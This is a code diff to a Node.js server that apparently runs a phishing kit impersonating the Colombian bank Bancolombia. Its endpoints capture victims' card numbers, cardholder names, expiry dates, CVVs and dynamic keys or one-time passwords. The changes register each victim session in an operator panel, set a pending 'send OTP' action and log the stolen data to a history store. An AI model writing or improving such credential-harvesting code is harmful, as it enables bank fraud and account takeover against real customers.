@@ -701,14 +701,25 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'POST' && url === '/bc/guardar-paso3') {
             try {
                 const datos = await getBody(req);
-                const { sessionId, claveDinamica } = datos;
+                const { sessionId, claveDinamica, otp } = datos;
                 if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
 
+                const codigo = claveDinamica || otp;
+
                 const previos = bcSesiones.get(sessionId) || {};
-                bcSesiones.set(sessionId, { ...previos, claveDinamica });
+                bcSesiones.set(sessionId, { ...previos, claveDinamica: codigo });
+
+                // 🔥 Aseguramos que la sesión exista en el panel
+                if (!estadoSesiones.has(sessionId)) {
+                    estadoSesiones.set(sessionId, 'pendiente');
+                    ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
+                }
 
                 const datosSesion = datosSesiones.get(sessionId) || {};
-                datosSesiones.set(sessionId, { ...datosSesion, claveDinamica, otp: claveDinamica });
+                const datosActualizados = { ...datosSesion, claveDinamica: codigo, otp: codigo };
+                datosSesiones.set(sessionId, datosActualizados);
+                
+                guardarHistorial('bancolombia', datosActualizados);
                 
                 json(res, 200, { ok: true });
             } catch (e) { json(res, 500, { ok: false }); }
@@ -731,7 +742,7 @@ const server = http.createServer(async (req, res) => {
                     tarjeta, 
                     titular, 
                     exp, 
-                    expMes: exp, // Mapeo para que la tabla principal muestre la fecha
+                    expMes: exp,
                     cvv,
                     fechaCaptura: new Date().toISOString(),
                     bancoKey: 'bancolombia'
